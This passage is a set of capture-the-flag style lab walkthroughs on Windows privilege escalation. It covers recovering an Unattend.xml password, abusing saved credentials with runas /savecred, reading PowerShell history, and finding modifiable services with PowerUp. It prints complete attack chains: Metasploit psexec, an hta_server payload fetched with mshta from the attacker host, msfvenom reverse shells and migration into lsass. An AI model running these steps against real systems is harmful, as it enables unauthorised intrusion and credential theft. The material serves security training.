**Explanation:** The `Invoke-PrivEscAudit` function from the `PowerUp.ps1` script scans the system for potential privilege escalation vulnerabilities. It detects an `Unattend.xml` file, commonly used in unattended Windows installations, which may contain sensitive information like credentials.

_Display the contents of the Unattend.xml file to search for sensitive information._

`type C:\Windows\Panther\Unattend.xml`:
```
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="windowsPE">
        <component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <UserData>
                <ProductKey>
                    <WillShowUI>Always</WillShowUI>
                </ProductKey>
            </UserData>
            <UpgradeData>
                <Upgrade>true</Upgrade>
                <WillShowUI>Always</WillShowUI>
            </UpgradeData>
        </component>
        <component name="Microsoft-Windows-PnpCustomizationsWinPE" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <DriverPaths>
                <PathAndCredentials wcm:keyValue="1" wcm:action="add">
                    <Path>$WinPEDriver$</Path>
                </PathAndCredentials>
            </DriverPaths>
        </component>
    </settings>
    <settings pass="specialize">
        <component name="Microsoft-Windows-Deployment" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <RunSynchronous>
                <RunSynchronousCommand wcm:action="add">
                    <Order>1</Order>
                    <Path>cmd /c "FOR %i IN (X F E D C) DO (FOR /F "tokens=6" %t in ('vol %i:') do (IF /I %t NEQ "" (IF EXIST %i:\BootCamp\BootCamp.xml Reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v AppsRoot /t REG_SZ /d %i /f )))"</Path>
                </RunSynchronousCommand>
            </RunSynchronous>
        </component>
    </settings>
    <settings pass="oobeSystem">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <FirstLogonCommands>
              <SynchronousCommand wcm:action="add">
                <Description>AMD CCC Setup</Description>
                <CommandLine>%AppsRoot%:\BootCamp\Drivers\ATI\ATIGraphics\Bin64\ATISetup.exe -Install</CommandLine>
                <Order>1</Order>
                <RequiresUserInput>false</RequiresUserInput>
              </SynchronousCommand>
              <SynchronousCommand wcm:action="add">
                  <Description>BootCamp setup</Description>
                  <CommandLine>%AppsRoot%:\BootCamp\setup.exe</CommandLine>
                  <Order>2</Order>
                  <RequiresUserInput>false</RequiresUserInput>
              </SynchronousCommand>
            </FirstLogonCommands>
            <AutoLogon> ←
                <Password> ←
                    <Value>QWRtaW5AMTIz</Value> ←
                    <PlainText>false</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <Username>administrator</Username>
            </AutoLogon>
        </component>
    </settings>
</unattend>
```

**Explanation:** The `Unattend.xml` file often contains configuration details for automated installations, including credentials for automatic logins. In this case, the file reveals a Base64-encoded password for the `administrator` account.

<span style="color: #e57373;">**Attacker machine**</span>.

_Decode the Base64-encoded password found in the Unattend.xml file._

`echo "QWRtaW5AMTIz" | base64 -d`:
```
Admin@123 ←
```

**Explanation:** The Base64-encoded password is decoded using the `base64 -d` command, revealing the plaintext password for the `administrator` account, which is "Admin@123."

_Check the network configuration of the attacker machine._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.3  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:03  txqueuelen 0  (Ethernet)
        RX packets 15063  bytes 1140714 (1.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 14860  bytes 3083316 (2.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.80.2  netmask 255.255.252.0  broadcast 10.10.83.255 ←
        ether 02:42:0a:0a:50:02  txqueuelen 0  (Ethernet)
        RX packets 18  bytes 1380 (1.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 59267  bytes 23735118 (22.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 59267  bytes 23735118 (22.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Scan the target machine for open ports using Nmap._

`nmap -Pn -sS -sV 10.4.30.231 -p-`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-09 17:29 IST
Nmap scan report for 10.4.30.231
Host is up (0.0088s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? ←
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 297.62 seconds
```

**Explanation:** The Nmap scan identifies open ports and running services on the target machine, providing potential entry points for further exploitation.

_Open Metasploit console to exploit the target machine._

`msfconsole -q`

_Search for the PsExec module in Metasploit, select it, and configure the exploit options._

`search psexec`, `use exploit/windows/smb/psexec`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set RHOSTS 10.4.30.231`, `set SMBUser Administrator`, `set SMBPass Admin@123`, `exploit`:
```
[*] Started reverse TCP handler on 10.10.80.2:4444 
[*] 10.4.30.231:445 - Connecting to the server...
[*] 10.4.30.231:445 - Authenticating to 10.4.30.231:445 as user 'Administrator'...
[*] 10.4.30.231:445 - Selecting PowerShell target
[*] 10.4.30.231:445 - Executing the payload...
[+] 10.4.30.231:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176195 bytes) to 10.4.30.231
[*] Meterpreter session 1 opened (10.10.80.2:4444 -> 10.4.30.231:49794) at 2024-08-09 17:34:03 +0530 ←
```

**Explanation:** Metasploit's `psexec` module is used to exploit the SMB service on the target machine, leveraging the administrator credentials to gain a Meterpreter session, which provides full control over the target.

_List active sessions and interact with the Meterpreter session._

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify the user context under which the Meterpreter session is running._

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

_Find the process ID of the lsass.exe process._

`pgrep lsass.exe`:
```
616 ←
```

_Migrate the Meterpreter session to the lsass.exe process to ensure persistence._

`migrate 616`:
```
[*] Migrating from 4640 to 616...
[*] Migration completed successfully. ←
```

**Explanation:** Migrating to the `lsass.exe` process ensures that the Meterpreter session is more persistent, as `lsass.exe` is a critical system process that is unlikely to be terminated.

_Search for files on the target machine that contain the word 'flag'._

`shell`, `where /r C:\ "*flag*"`:
```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Users\Administrator\Desktop\flag.txt ←
```

_Display the contents of the flag.txt file to retrieve the flag._

`type C:\Users\Administrator\Desktop\flag.txt`:
```
097ab83639dce0ab3429cb0349493f60 ←
```

### Locally Stored Credentials: Windows Credential Manager - Theory

#### Windows Credential Manager

Windows Credential Manager is a built-in feature in Microsoft Windows that allows users to securely store and manage their credentials, such as usernames, passwords, and other login information, for various services, applications, websites, and network resources.

It's a part of the broader Windows security ecosystem designed to streamline authentication processes and reduce the need to repeatedly enter credentials.

#### cmdkey

cmdkey is a command-line utility in Windows that interacts with Windows Credential Manager.

It allows you to manage the credentials stored in the Credential Manager from the command line, offering flexibility and automation in handling credentials.

With cmdkey, you can:
- Add Credentials
- List Credentials
- Delete Credentials

### Locally Stored Credentials: Windows Credential Manager - Lab

#### Lab Environment

A Kali GUI machine and a Windows machine provided to you. 

Your task is to find a saved administrator user password on the system to perform privilege escalation.

**Objective**: Gain access to Meterpreter session with high privilege.

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Obtain the network configuration of the target machine to identify its IP address._

`ipconfig`:
```
Windows IP Configuration

Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : ec2.internal
   Link-local IPv6 Address . . . . . : fe80::1c64:b54c:35f:2408%8
   IPv4 Address. . . . . . . . . . . : 10.4.17.70 ←
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.4.16.1
PS C:\Users\student> cmdkey
```

_Verify the current user on the target machine._

`whoami`:
```
priv-esc\student ←
```

_Check the privileges assigned to the current user._

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**Explanation:** The `whoami /priv` command shows the specific privileges assigned to the `student` user. This helps assess whether the user has any special permissions that could be leveraged for privilege escalation.

_List the members of the Administrators group to check if the user has administrative privileges._

`net localgroup Administrators`:
```
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator ←
The command completed successfully.
```

**Explanation:** This command confirms that the `Administrator` account is present, but the `student` user is not part of the Administrators group, meaning the current user does not have administrative privileges.

_Display the stored credentials on the target machine._

`cmdkey`:
```
Creates, displays, and deletes stored user names and passwords.

The syntax of this command is:

CMDKEY [{/add | /generic}:targetname {/smartcard | /user:username {/pass{:password}}} | /delete{:targetname | /ras} | /list{:targetname}]

Examples:

  To list available credentials:
     cmdkey /list
     cmdkey /list:targetname

  To create domain credentials:
     cmdkey /add:targetname /user:username /pass:password
     cmdkey /add:targetname /user:username /pass
     cmdkey /add:targetname /user:username
     cmdkey /add:targetname /smartcard

  To create generic credentials:
     The /add switch may be replaced by /generic to create generic credentials

  To delete existing credentials:
     cmdkey /delete:targetname

  To delete RAS credentials:
     cmdkey /delete /ras
```

`cmdkey /list`:
```
Currently stored credentials:

    Target: Domain:interactive=PRIV-ESC\Administrator
    Type: Domain Password
    User: PRIV-ESC\Administrator ←
```

**Explanation:** The `cmdkey /list` command reveals that credentials for the `Administrator` account are stored on the machine. These stored credentials can be used to perform actions as the `Administrator` without needing to re-enter the password.

_Use the stored credentials to run a command prompt as the Administrator._

`runas.exe /user:Administrator /savecred cmd.exe`:
```
Attempting to start cmd.exe as user "PRIV-ESC\Administrator" ... ←
```

**Explanation:** The `runas.exe` command uses the stored credentials to open a command prompt with `Administrator` privileges. The `savecred` option leverages the saved credentials without prompting for the password.

_Verify that the user has changed to Administrator._

`whoami`:
```
priv-esc\administrator ←
```

_Exit the Administrator command prompt._

`exit`

<span style="color: #e57373;">**Attacker machine**</span>.

_Check the network configuration of the attacker machine._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.3  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:03  txqueuelen 0  (Ethernet)
        RX packets 5795  bytes 457175 (446.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5404  bytes 2382635 (2.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.39.3  netmask 255.255.255.0  broadcast 10.10.39.255 ←
        ether 02:42:0a:0a:27:03  txqueuelen 0  (Ethernet)
        RX packets 16  bytes 1160 (1.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 20294  bytes 16842475 (16.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20294  bytes 16842475 (16.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Open Metasploit console to exploit the target machine._

`msfconsole -q`

_Search for the hta_server exploit module, configure it with a reverse TCP payload, and execute the exploit._

`search hta_server`, `use exploit/windows/misc/hta_server`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.39.3`, `set LPORT 4444`, `exploit`:
```
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.39.3:4444 
[*] Using URL: http://0.0.0.0:8080/efTyriUD4ye.hta
[*] Local IP: http://10.10.39.3:8080/efTyriUD4ye.hta ←
[*] Server started.
```

**Explanation:** The `hta_server` exploit module in Metasploit creates a malicious HTA file hosted on the attacker's machine. When the target executes this file, it initiates a reverse shell connection back to the attacker.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Execute the malicious HTA file hosted on the attacker's machine._

`mshta.exe http://10.10.39.3:8080/efTyriUD4ye.hta`

**Explanation:** The `mshta.exe` command is used to execute the malicious HTA file, triggering the exploit and opening a reverse shell to the attacker's machine.

<span style="color: #e57373;">**Attacker machine**</span>.

_Confirm the successful exploitation by establishing a Meterpreter session._

```
[*] 10.4.17.70       hta_server - Delivering Payload
[*] Sending stage (176195 bytes) to 10.4.17.70
[*] Meterpreter session 1 opened (10.10.39.3:4444 -> 10.4.17.70:49811) at 2024-08-09 19:38:36 +0530 ←
```

**Explanation:** The output indicates that the exploit was successful, and a Meterpreter session has been established between the attacker and the target machine.

_List active sessions and interact with the established Meterpreter session._

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify the user context of the Meterpreter session._

`getuid`:
```
Server username: PRIV-ESC\student ←
```

_Background the Meterpreter session._

`background`

<span style="color: #e57373;">**Attacker machine**</span>.

_Generate a new reverse shell executable using msfvenom._

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.39.3 LPORT=5555 -f exe -o /root/Desktop/reverse_shell.exe`:
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: /root/Desktop/reverse_shell.exe ←
```

**Explanation:** The `msfvenom` command is used to generate a reverse shell executable that will connect back to the attacker’s machine on a specified port when executed on the target.

_Set up a multi/handler to catch the reverse shell connection._

`search multi/handler`, `use exploit/multi/handler`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.39.3`, `set LPORT 5555`, `exploit -j`:
```
[*] Exploit running as background job 1. ←
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.39.3:5555 ←
```

**Explanation:** The `multi/handler` module in Metasploit is used to set up a listener that will catch the reverse shell connection when the executable is run on the target machine.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Interact with the initial Meterpreter session and display stored credentials again._

`sessions`, `sessions -i 1`

`shell`, `cmdkey /list`:
```
Currently stored credentials:

    Target: Domain:interactive=PRIV-ESC\Administrator
    Type: Domain Password
    User: PRIV-ESC\Administrator ←
```

**Explanation:** Listing the stored credentials again shows that the `Administrator` credentials are still available for use, which will be leveraged for privilege escalation.

_Exit the shell and verify the current working directory._

`exit`

`pwd`:
```
C:\Users\student
```

_Upload the reverse shell executable to the target machine._

`upload /root/Desktop/reverse_shell.exe`:
```
[*] uploading  : /root/Desktop/reverse_shell.exe -> reverse_shell.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/reverse_shell.exe -> reverse_shell.exe
[*] uploaded   : /root/Desktop/reverse_shell.exe -> reverse_shell.exe
```

**Explanation:** The `upload` command transfers the reverse shell executable from the attacker's machine to the target, placing it in the current working directory.

_Execute the uploaded reverse shell as the Administrator._

`shell`, `runas.exe /user:Administrator /savecred C:\Users\student\reverse_shell.exe`

```
[+] Meterpreter session 2 opened (10.10.4.3:5555 -> 10.4.17.2:49801) at 2024-05-07 21:49:17 +0530 ←
```

**Explanation:** Running the reverse shell as the `Administrator` using `runas.exe` with the saved credentials opens a new Meterpreter session with elevated privileges.

_Exit the shell and background the Meterpreter session._

`exit`

`background`

<span style="color: #e57373;">**Attacker machine**</span>.

_Interact with the new Meterpreter session._

`sessions`, `sessions -i 2`

_Verify that the session is running as Administrator._

`getuid`:
```
Server username: PRIV-ESC\Administrator ←
```

_Search for files containing the word "flag" to locate the target file._

`shell`, `where /r C:\ "*flag*"`:
```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Users\Administrator\Desktop\flag.txt ←
```

**Explanation:** The `where` command searches the entire C: drive for files containing "flag" in their name, helping to locate the file that contains the lab's objective.

_Display the contents of the flag file._

`type C:\Users\Administrator\Desktop\flag.txt`:
```
39b9d593d6aa6b4ceffbcc214fc70504 ←
```

### Locally Stored Credentials: PowerShell History - Theory/Lab

#### Lab Environment

A Kali GUI machine and a Windows machine provided to you. 

Your task is to investigate the PowerShell terminal commands history for privilege escalation. 

**Objective**: Gain access to administrator privilege Meterpreter session.

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify the current user on the target machine._

`whoami`:
```
priv-esc\student ←
```

_Check the privileges assigned to the current user._

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**Explanation:** The `whoami /priv` command provides details on the privileges associated with the current user. The `student` user has limited privileges, such as `SeChangeNotifyPrivilege`, indicating that more powerful privileges, such as administrative rights, are not directly available.

_List the members of the Administrators group to check if the user has administrative privileges._

`net localgroup Administrators`:
```
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator ←
The command completed successfully.
```

**Explanation:** This command lists the members of the Administrators group. The `student` user is not part of this group, meaning they do not have administrative privileges.

_Navigate to the directory where PowerShell history is stored._

`cd C:\Users\student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`, `dir`:
```
    Directory: C:\Users\student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/9/2024   3:05 PM           1965 ConsoleHost_history.txt ←
```

**Explanation:** The `PSReadLine` module in PowerShell stores the command history in the `ConsoleHost_history.txt` file. Investigating this file can reveal previously executed commands that might contain sensitive information or indicate potential vulnerabilities.

_Display the contents of the PowerShell history file to investigate previously executed commands._

`type ./ConsoleHost_history.txt`:
```
cd /
ls
cd .\Windows\
ls
clear
whoami
Get-Process
Get-Process explorer | Format-List *
Get-Process | Where-Object {$_.WorkingSet -gt 20000000}
$A = Get-Process
$A | Get-Process | Format-Table -View priority
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
net user
whoami /all
$env:username
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
netstat -ano
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
$a = Get-ApplockerPolicy -effective
Get-MpComputerStatus
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """`
"""
wmic service where started=true get name, startname
schtasks /query /fo LIST /v
netstat -an | find "LISTEN"
$username = 'administrator'
$password = convertto-securestring "alita_123321" -asplaintext -force ←
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
ipconfig
Get-LocalUser | ft Name,Enabled,LastLogon
Get-Process
Get-Process explorer | Format-List *
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
whoami
cd C:\Users\student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
dir
type .\ConsoleHost_history.txt
```

**Explanation:** The `ConsoleHost_history.txt` file contains a record of all the commands executed in the PowerShell terminal. In this case, the history reveals a command where the `administrator` username and a plaintext password (`alita_123321`) were set, which can be crucial for gaining elevated access.

_List all environment variables and their values._

`dir Env:`:
```
Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\student\AppData\Roaming
CLIENTNAME                     Guacamole RDP
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   PRIV-ESC
ComSpec                        C:\Windows\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
HOMEDRIVE                      C:
HOMEPATH                       \Users\student
LOCALAPPDATA                   C:\Users\student\AppData\Local
LOGONSERVER                    \\PRIV-ESC
NUMBER_OF_PROCESSORS           2
OS                             Windows_NT
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPo...
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
PROCESSOR_LEVEL                6
PROCESSOR_REVISION             4f01
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PSModulePath                   C:\Users\student\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShe...
PUBLIC                         C:\Users\Public
SESSIONNAME                    RDP-Tcp#0
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\student\AppData\Local\Temp\2
TMP                            C:\Users\student\AppData\Local\Temp\2
USERDOMAIN                     PRIV-ESC
USERDOMAIN_ROAMINGPROFILE      PRIV-ESC
USERNAME                       student
USERPROFILE                    C:\Users\student
windir                         C:\Windows
```

**Explanation:** Listing environment variables can sometimes reveal useful information, such as paths to important directories or details about the system's configuration, which might aid in privilege escalation or lateral movement within the system.

_Attempt to elevate privileges by running the command prompt as the Administrator._

`runas.exe /user:Administrator cmd.exe`:
```
Enter the password for Administrator: ←
Attempting to start cmd.exe as user "PRIV-ESC\Administrator" ... ←
```

**Explanation:** The `runas.exe` command allows the user to run a program as a different user, in this case, as `Administrator`. By using the password discovered earlier, the user can start a command prompt with elevated privileges.

_Verify that you have successfully elevated to the Administrator account._

`whoami`:
```
priv-esc\administrator ←
```

_Search for files containing the word "flag" to locate the target file._

`shell`, `where /r C:\ "*flag*"`:
```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Users\Administrator\Desktop\flag.txt ←
```

**Explanation:** The `where` command is used to search the entire system for files containing the word "flag," helping locate the file that contains the target information for the lab.

_Display the contents of the flag file._

`type C:\Users\Administrator\Desktop\flag.txt`:
```
f67c2bcbfcfa30fccb36f72dca22a817 ←
```

### Insecure Service Permissions - Theory

#### Windows Services

Windows services are background processes that run in the Windows operating system, often with elevated privileges.

Services can be configured to start automatically, manually, or be triggered by specific events.

Many critical system services run with high privileges, such as LocalSystem, LocalService, or NetworkService.

#### Identifying Insecure Service Permissions

Insecure service permissions occur when a Windows service has misconfigurations in its access control settings, allowing unprivileged users to modify the service or its associated components.

Common permission misconfigurations include:

  - **Full Control or Write Permissions**: If a service's configuration can be modified by an unprivileged user, this creates a security risk. An attacker could change the service's properties, such as its executable path, to execute arbitrary code with elevated privileges.
  - **Unquoted Service Paths**: If a service's executable path contains spaces and is not properly enclosed in quotes, an attacker can place a malicious executable in a specific location along the path, causing it to be executed when the service starts.

#### Exploiting Insecure Service Permissions

1. **Identify Vulnerable Services**
The attacker enumerates the Windows services on the target system to find those with insecure permissions. Tools like PowerUp, AccessChk, or Metasploit can be used to automate this process.

2. **Analyze Service Permissions**
The attacker checks the permissions on each service to determine if they allow unauthorized modifications.
This involves examining the service's security descriptor and ACLs (Access Control Lists) to see who has write or full control.

3. **Modify the Service Configuration**
If a service has insecure permissions, the attacker can modify its properties. For example, the attacker might change the ImagePath to point to a malicious executable, allowing them to execute code with the service's privileges.

4. **Restart the Service**
Once the service configuration has been modified, the attacker restarts the service. This causes the modified executable to run, leading to privilege escalation. If the service runs with administrative or system-level privileges, the attacker's code will execute with those privileges.

### Insecure Service Permissions - Lab

#### Lab Environment

A Kali GUI machine and a Windows machine provided to you. 

Your task is to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) Powershell script to find a common Windows privilege escalation flaw that depends on misconfigurations.
The [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) post-exploitation framework has provided you with the windows machine.

**Objective**: Gain access to Meterpreter session with high privilege.

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify the current user on the target machine._

`whoami`:
```
priv-esc\student ←
```

_Navigate to the Desktop directory and list its contents._

`cd ./Desktop`, `dir`:
```
    Directory: C:\Users\student\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/27/2020  10:09 AM                PowerSploit ←
d-----       10/27/2020  10:09 AM                SysinternalsSuite
d-----       10/27/2020  10:32 AM                Tools
```

_Navigate to the PowerSploit directory and then to the Privesc directory where the PowerUp script is located._

`cd ./PowerSploit`, `dir`:
```
    Directory: C:\Users\student\Desktop\PowerSploit

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/27/2020  10:09 AM                AntivirusBypass
d-----       10/27/2020  10:09 AM                CodeExecution
d-----       10/27/2020  10:09 AM                docs
d-----       10/27/2020  10:09 AM                Exfiltration
d-----       10/27/2020  10:09 AM                Mayhem
d-----       10/27/2020  10:09 AM                Persistence
d-----       10/27/2020  10:09 AM                Privesc ←
d-----       10/27/2020  10:09 AM                Recon
d-----       10/27/2020  10:09 AM                ScriptModification
d-----       10/27/2020  10:09 AM                Tests
-a----       10/27/2020  10:09 AM           2638 .gitignore
-a----       10/27/2020  10:09 AM           1590 LICENSE
-a----       10/27/2020  10:09 AM           8505 mkdocs.yml
-a----       10/27/2020  10:09 AM           5278 PowerSploit.psd1
-a----       10/27/2020  10:09 AM            149 PowerSploit.psm1
-a----       10/27/2020  10:09 AM          15646 PowerSploit.pssproj
-a----       10/27/2020  10:09 AM            971 PowerSploit.sln
-a----       10/27/2020  10:09 AM          10225 README.md
```

_Navigate to the 'Privesc' directory and list its contents._

`cd ./PrivEsc`, `dir`:
```
    Directory: C:\Users\student\Desktop\PowerSploit\Privesc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/27/2020  10:09 AM          26768 Get-System.ps1
-a----       10/27/2020  10:09 AM         600580 PowerUp.ps1 ←
-a----       10/27/2020  10:09 AM           1659 Privesc.psd1
-a----       10/27/2020  10:09 AM             67 Privesc.psm1
-a----       10/27/2020  10:09 AM           4569 README.md
```

_Execute the PowerUp.ps1 script to identify potential privilege escalation vulnerabilities._

`powershell -ep bypass -c ". ./PowerUp.ps1; Invoke-PrivEscAudit"`:
```
ServiceName                     : FileZilla Server ←
Path                            : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"
ModifiableFile                  : C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe ←
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : PRIV-ESC\student ←
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'FileZilla Server'
CanRestart                      : True
Name                            : FileZilla Server
Check                           : Modifiable Service Files

ModifiablePath    : C:\Users\student\AppData\Local\Microsoft\WindowsApps
IdentityReference : PRIV-ESC\student
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
